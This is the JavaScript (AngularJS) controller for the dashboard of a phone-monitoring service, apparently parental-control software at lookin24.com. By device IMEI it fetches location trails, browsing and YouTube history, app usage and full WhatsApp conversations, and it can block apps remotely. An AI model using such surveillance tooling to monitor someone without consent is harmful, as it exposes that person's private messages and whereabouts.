var app = angular.module("app", ['stringUtil', 'ui.scroll']).controller("myCtrl", function($scope, $http, stringUtil,
                                                                                             $timeout, $interval, Server, $window) {

    //$scope.names = ["Emil", "Tobias", "Linus"];
    //$scope.selectedName = $scope.names[0];

    $scope.curMenu = 'Gundelik';
    $scope.aa = [];
    $scope.aktivleshdir = false;


    //infinitescroll
    $scope.wpall = [];
    $scope.wpitems = [];
    $scope.wpallindex = 0;
    $scope.loadMore = function() {
        // simulate an ajax request
        $timeout( function() {
            for (var i = 0; i < 15 && $scope.wpallindex < $scope.wpall.length; i++) {
                $scope.wpitems.unshift($scope.wpall[$scope.wpallindex++]);

            }});
    };
    //infinitescroll



    $scope.message=["Hello Wdsdorld",'dasdas'];
    $scope.whatsapp = false;
    $scope.whatsappc = false;
    $scope.v = false;
    $scope.w = false;
    $scope.m = false;
    $scope.g = true;
    $scope.y = false;
    $scope.istifadeler = false;
    $scope.icazeler = false;
    $scope.txt = "asdsd";
    $scope.markers = [];
    $scope.flightPath = null;
    $scope.whatsaps = [];
    $scope.curConversation = null;
    $scope.loadingdiv = false;
    $scope.gpsI = false;
    $scope.silI = false;
    $scope.curDay = new Date();

    $scope.stringUtil = stringUtil;
    $scope.DateHelper = DateHelper;



    $scope.changeData = function() {
        if($scope.g) {
            $scope.gunluk = [];
            $scope.gundelik(0);
        }else if($scope.y) {
            $scope.youtubes = [];
            $scope.yact(0);
        }else if($scope.w) {
            $scope.websites = [];
            $scope.Web(0);
        }else if($scope.istifadeler) {
            $scope.activityHelper.day = [];
            $scope.activityHelper.todaySum = undefined;
            $scope.gundelik(0);
        }else if($scope.m) {
            $scope.clearLocation();
            $scope.location(0);
        }
    }
    $scope.gunuAzalt = function() {
        $scope.curDay.setDate($scope.curDay.getDate()-1);
        console.log("Gunuazalt basildi");
        console.log($scope.curDay + " " + $scope.curDay.getTime());
        $scope.changeData();
    }
    $scope.gunuArtir = function() {
        if($scope.DateHelper.isToday($scope.curDay)) {
            return;
        }
        $scope.curDay.setDate($scope.curDay.getDate()+1);
        $scope.changeData();
        console.log("Gunuartir basildi");
    }
    $scope.toHour = function(time) {
        var d = new Date(time);
        if(!$scope.stringUtil.isToday(d)) {
            return ((d.getMonth() > 8) ? (d.getMonth() + 1) : ('0' + (d.getMonth() + 1))) + '/' + ((d.getDate() > 9) ? d.getDate() : ('0' + d.getDate())) + '/' + d.getFullYear();
        }
        var h = d.getHours();
        var m = d.getMinutes();

        h = (h<10) ? '0' + h : h;
        m = (m<10) ? '0' + m : m;

        return h + ':' + m;
    }
    $scope.openy = function(url) {
        if(!url.startsWith('http')) {
            url = 'http://' + url;
        }
        window.open(url);
    };

    $scope.divide = function(a,b) {
        var ans = a / b;
        return parseInt(ans);
    }
    $scope.cixish = function() {
        var cookies = document.cookie.split(";");
        console.log(cookies);
        for (var i = 0; i < cookies.length; i++) {
            var cookie = cookies[i];
            var eqPos = cookie.indexOf("=");
            var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
            document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
        }
        $window.location.href = 'https://www.lookin24.com/login.html';
    }


    $scope.block = function(a,b,c,d) {
        var block = (c.blocked) ? 0 : 1;
        console.log(b);
        console.log("block status gonderildi " + block)
        $scope.loadingdiv = true;

        $http.get('https://lookin24.com/blockApp?imei='+$scope.selectedName.imei+'&package='+b+'&block='+block).then(function (d) {
            console.log(d.data.apps + " " + $scope.imei);
            $scope.loadingdiv = false;

            c.blocked = c.blocked ^ true;

        }, function () {

        });

    };

    $scope.clearLocation = function() {
        for(var i = 0; i < $scope.markers.length; i++) {
            $scope.markers[i].setMap(null);
        }
        if($scope.flightPath != null) {
            $scope.flightPath.setMap(null);
        }
    }
    $scope.location = function(m) {
        if(m != 0) $scope.curDay = new Date();
        console.log("cur " + m + "----" + $scope.curDay);
        $scope.loadingdiv = true;
        console.log("Location Called");

        $http.get('https://lookin24.com/sendCommand?imei='+$scope.selectedName.imei+'&sendLocation=1&curDay='+$scope.DateHelper.toUTC($scope.curDay)+'&off='+$scope.curDay.getTimezoneOffset()).then(function (d) {
            console.log(d.data.data);
            $scope.clearLocation();
            $scope.loadingdiv = false;
            //test data
            // d.data.data = [
            //     {start: "1586602656081", lo: "10.373508", la: "52.061589"},
            //     {start: "1586602697465", lo: "10.3742054", la: "52.0623917"},
            //     {start: "1586602757443", lo: "10.3746074", la: "52.060913"},
            //     {start: "1586602817456", lo: "10.3751552", la: "52.0575757"},
            //     {start: "1586602877461", lo: "10.3716101", la: "52.0564132"},
            //     {start: "1586602937462", lo: "10.3731574", la: "52.052786"},
            //     {start: "1586602997467", lo: "10.372823", la: "52.0502005"},
            //     {start: "1586603174063", lo: "10.3739413", la: "52.0510719"},
            //     {start: "1586604423569", lo: "10.373495", la: "52.0615974"}
            // ];
            if(d.data.data == undefined) {
                return;
            }

            $scope.locations = d.data.data;


            //$scope.locations.reverse();
            if($scope.locations == undefined) {
                console.log("SendCommand Time out" + map);

                return;
            }
            var l = $scope.locations;

            var flightPlanCoordinates = [];


            for(var i = 0; i < l.length; i++) {

                console.log("marker added");
                l[i].lo = parseFloat(l[i].lo);
                l[i].la = parseFloat(l[i].la);

                if(i == l.length-1) {
                    map.setCenter({lat: l[i].la, lng: l[i].lo});
                }
                flightPlanCoordinates.push( {lat: l[i].la, lng: l[i].lo});
                var time = $scope.stringUtil.toTime(parseInt(l[i].start));
                time = time.substring(time.length - 5);

                if(true) {
                    var infowindow = new google.maps.InfoWindow();
                    var marker = new google.maps.Marker({
                        position: {lat: l[i].la, lng: l[i].lo},
                        map: map,
                        // label: {
                        //     text:  time,
                        //     color: "#2c3e0f",
                        //     fontSize: "20px"
                        // },
                        draggable:true,
                        icon: {
                            url: 'https://lookin24.com/nomre/number_'+(i+1)+'.png',
                            origin: new google.maps.Point(0, 0),
                            labelOrigin: new google.maps.Point(20, -10)
                        },
                        labelClass:'labels',
                        zIndex:i
                    });
                    var content = time;
                    marker.isopen = false;
                    if(i==l.length-1) {
                        marker.isopen = true;
                        infowindow.open(map,marker);
                        infowindow.setContent(content);
                    }

                    google.maps.event.addListener(marker,'click', (function(marker,content,infowindow){
                        return function() {
                            if(!marker.isopen) {
                                infowindow.setContent(content);
                                infowindow.open(map,marker);
                            }else {
                                infowindow.close();
                            }
                            marker.isopen = !marker.isopen;
                        };
                    })(marker,content,infowindow));
                    $scope.markers.push(marker);
                }
            }

            var lineSymbol = {
                strokeOpacity: 1
            };
            $scope.flightPath = new google.maps.Polyline({
                path: flightPlanCoordinates,
                // strokeOpacity: 0,
                icons: [{
                    icon: lineSymbol,
                    offset: '100',
                    repeat: 'opx',
                }],
                map: map,
                strokeColor: 'rgb(255,0,5)'
            });

            map.panTo(flightPlanCoordinates[flightPlanCoordinates.length]);




        }, function () {

        });

    }

    $scope.Web = function(m) {
        if(m != 0) $scope.curDay = new Date();
        $scope.loadingdiv = true;
        $http.get('https://lookin24.com/sendCommand?imei='+$scope.selectedName.imei+'&sendWebsites=1&curDay='+$scope.DateHelper.toUTC($scope.curDay)+'&off='+$scope.curDay.getTimezoneOffset()).then(function (d) {
            console.log(d.data.data);
            $scope.loadingdiv = false;
            if(d.data.data == undefined) {
                return;
            }

            $scope.websites = d.data.data;
            $scope.websites.reverse();
            if($scope.websites == undefined) {
                console.log("SendCommand Time out");
                return;
            }
        }, function () {

        });

    }
    $scope.whatsappf = function() {
        $scope.loadingdiv = true;

        $http.get('https://lookin24.com/WpCons?imei='+$scope.selectedName.imei).then(function (d) {
            $scope.loadingdiv = false;
            console.log(d);
            $scope.whatsaps = d.data.data;

            $scope.whatsaps.sort(function (a, b) {
                return b.start - a.start;
            })
        }, function () {

        });

    }
    $scope.bodyst = function() {
        if($scope.whatsappc == true) return {overflow:"hidden"};
        else return {};
    }
    $scope.openc = function(m) {
        console.log("Openc called");
        console.log(m.con);
        $scope.whatsapp = false;
        $scope.whatsappc = true;
        $scope.v = false;
        $scope.w = false;
        $scope.m = false;
        $scope.g = false;
        $scope.y = false;
        $http.get('https://lookin24.com/WpCon?imei='+$scope.selectedName.imei + '&name='+m.name + '&num='+m.number).then(function (d) {
            $scope.loadingdiv = false;
            console.log(d);




            $scope.wpall = [];
            $scope.wpitems = [];
            $scope.wpallindex = 0;
            //m.con = m.con.reverse();
            $scope.curConversation = m;
            $scope.wpall = d.data.data;

            $scope.loadMore();

            setTimeout(function () {
                $( "body" ).scrollTop(1000000);
            }, 100);
        }, function () {

        });


    }
    $scope.bodystyle={overflow:"hidden"};
    $scope.gundelik = function(m) {
        if(m != 0) $scope.curDay = new Date();
        $scope.loadingdiv = true;

        $http.get('https://lookin24.com/sendCommand?imei='+$scope.selectedName.imei+'&curDay='+$scope.DateHelper.toUTC($scope.curDay)+'&off='+$scope.curDay.getTimezoneOffset()).then(function (d) {
            $scope.loadingdiv = false;
            console.log(d.data.data);

            $scope.gunluk = d.data.data;
            if($scope.gunluk == undefined) {
                console.log("SendCommand Time out");
                return;
            }
            var t = [];
            for(var i = 0; i < $scope.aa.length; i++) {
                t[$scope.aa[i].package] = 1;
            }
            var ans = [];
            for(var i = 0; i < $scope.gunluk.length; i++) {
                if(t[$scope.gunluk[i].package] == undefined)continue;
                $scope.gunluk[i].start = parseInt($scope.gunluk[i].start);
                $scope.gunluk[i].end = parseInt($scope.gunluk[i].end);
                $scope.gunluk[i].duration = ($scope.gunluk[i].end == -1 ? (new Date()).getTime() : $scope.gunluk[i].end) - $scope.gunluk[i].start;
                $scope.gunluk[i].duration = $scope.divide($scope.gunluk[i].duration, 1000);
                if($scope.gunluk[i].end == -1) {
                    $scope.gunluk[i].end = 900719925474099;
                    //$scope.gunluk[i] = 9007199254740992;

                }
                ans.push($scope.gunluk[i]);

                console.log($scope.gunluk[i].duration);

            }

            $scope.gunluk = ans;

            $scope.gunluk.sort(function (a,b) {
                return b.end-a.end;
            })
            $scope.openActivity(1);

        }, function () {

        });

    }

    $scope.yact = function(m) {
        if(m != 0) $scope.curDay = new Date();
        $scope.loadingdiv = true;
        $http.get('https://lookin24.com/sendCommand?imei='+$scope.selectedName.imei+'&youtube=1&curDay=' +$scope.DateHelper.toUTC($scope.curDay)+'&off='+$scope.curDay.getTimezoneOffset()).then(function (d) {
            console.log(d.data.data);
            if(d.data.data == undefined) {
                return;
            }
            $scope.loadingdiv = false;

            $scope.youtubes = d.data.data;
            $scope.youtubes.reverse();
            if($scope.youtubes == undefined) {
                console.log("SendCommand Time out");
                return;
            }
            for(var i = 0; i < $scope.youtubes.length; i++) {
                //https://www.youtube.com/results?search_query=the+show+must+go+on
                $scope.youtubes[i].url = "www.youtube.com/results?search_query=" + encodeURI($scope.youtubes[i].name);
                console.log($scope.youtubes[i].url)
            }
            console.log($scope.youtubes);
        }, function () {

        });

    }
    $scope.openActivity = function(a) {
        var ah = new ActivityHelper();
        ah.init($scope.gunluk);
        $scope.activityHelper = ah;
    }
    $scope.gpsIcaze = function(d) {
        $scope.gpsI = !$scope.gpsI;
        console.log($scope.gpsI);
        var data = $scope.gpsI ? 1 : 0;
        $http.get('https://lookin24.com/gpsIcaze?imei='+$scope.selectedName.imei+'&icaze='+data).then(function (d) {
            console.log(d.data.data);

        }, function () {

        });
    }
    $scope.silIcaze = function(d) {
        $scope.silI = !$scope.silI;
        console.log($scope.silI);
        var data = $scope.silI ? 1 : 0;
        $http.get('https://lookin24.com/silIcaze?imei='+$scope.selectedName.imei+'&icaze='+data).then(function (d) {
            console.log(d.data.data);
        }, function () {

        });
    }
    $scope.safariyegore = function(m) {
        return (m.end == 900719925474099 ? 'Aktiv' : ($scope.DateHelper.toDuration(m.duration)))
    }
    $scope.fillSelect = function () {
        $http.post("/fillSelect", {parent:"1"}, { withCredentials: true }).then(
            function(res){
                $scope.names = res.data.data;
                if($scope.names.length > 0) {
                    $scope.selectedName = $scope.names[0];
                    $http.get('https://lookin24.com/getDevice?imei='+$scope.selectedName.imei).then(function (d) {
                        console.log(d.data.apps);
                        if(d.data.apps == undefined) {
                            return;
                        }
                        $scope.d = d.data;//h
                        console.log($scope.d);
                        console.log(d.data.imei);
                        $scope.aa = d.data.apps;
                        $scope.gpsI = parseInt(d.data.gpsIcaze);
                        $scope.silI = parseInt(d.data.silIcaze);
                        var activity = $scope.d.activity.data;
                        var du = {};
                        for(var i = 0; i < activity.length; i++) {
                            var start = activity[i].start;
                            var end = activity[i].end;
                            if(end == -1)
                                end = (new Date()).getTime();
                            var d = end - start;
                            if(du[activity[i].package] == undefined) {
                                du[activity[i].package] = d;
                            }else {
                                du[activity[i].package] += d;
                            }
                        }
                        for(var i = 0; i < $scope.aa.length; i++) {
                            if(du[$scope.aa[i].package] == undefined) {
                                du[$scope.aa[i].package] = 0;
                            }
                        }
                        console.log(du);
                        $scope.aa.sort(function (a, b) {
                            return du[b.package] - du[a.package];
                        })
                        $scope.gundelik();

                        //$scope.adapter.append($scope.aa);
                    }, function () {

                    });
                }
                console.log($scope.names)
            },
            function(response){
            }
        );
    }
    $scope.selectChange = function() {
        console.log($scope.selectedName);
        $scope.curMenu = 'Proqramlar';
        $http.get('https://lookin24.com/getDevice?imei='+$scope.selectedName.imei).then(function (d) {
            console.log(d.data.apps);
            if(d.data.apps == undefined) {
                return;
            }
            $scope.d = d.data;//h
            console.log($scope.d);
            console.log(d.data.imei);
            $scope.aa = d.data.apps;
            $scope.gpsI = parseInt(d.data.gpsIcaze);
            $scope.silI = parseInt(d.data.silIcaze);
            var activity = $scope.d.activity.data;
            var du = {};
            for(var i = 0; i < activity.length; i++) {
                var start = activity[i].start;
                var end = activity[i].end;
                if(end == -1)
                    end = (new Date()).getTime();
                var d = end - start;
                if(du[activity[i].package] == undefined) {
                    du[activity[i].package] = d;
                }else {
                    du[activity[i].package] += d;
                }
            }
            for(var i = 0; i < $scope.aa.length; i++) {
                if(du[$scope.aa[i].package] == undefined) {
                    du[$scope.aa[i].package] = 0;
                }
            }
            console.log(du);
            $scope.aa.sort(function (a, b) {
                return du[b.package] - du[a.package];
            })
        }, function () {

        });
    }
    //$scope.yact();
    //$scope.Web();

    //$scope.aa=[];

    $scope.fillSelect();




} )

app.directive('whenScrolled', ['$timeout', function($timeout) {
    return function(scope, elm, attr) {
        var raw = elm[0];

        $timeout(function() {
            raw.scrollTop = raw.scrollHeight;
        });

        elm.bind('scroll', function() {
            console.log("scroll function")
            if (raw.scrollTop <= 100) { // load more items before you hit the top
                var sh = raw.scrollHeight
                scope.$apply(attr.whenScrolled);
                raw.scrollTop = raw.scrollHeight - sh;
            }
        });
    };
}]);


var loadMe = angular.module('stringUtil',[]);

loadMe.factory('stringUtil', [function(){

    return stringUtil;
}]);

app.factory('Server', [
    '$timeout', '$q', function ($timeout, $q) {

        return {

            max: 100,

            first: 1,

            delay: 100,

            data: [],

            init: function () {
                for (var i = this.first; i <= this.max; i++) {
                    // this.data.push({
                    //     number: i,
                    //     title: 'Message #' + i,
                    //     text: Math.random().toString(36).substring(7)
                    // });
                }
            },

            request: function (start, end) {
                var self = this;
                var deferred = $q.defer();

                $timeout(function () {
                    var result = [];
                    if (start <= end) {
                        for (var i = start; i <= end; i++) {
                            var serverDataIndex = (-1) * i + self.first;
                            //if(serverDataIndex >= 0 && serverDataIndex <= self.data.length)
                            console.log(serverDataIndex)
                            var item = self.data[serverDataIndex];
                            if (item) {
                                result.push(item);
                            }
                        }
                    }
                    deferred.resolve(result);
                }, self.delay);

                return deferred.promise;
            }
        };

    }
]);
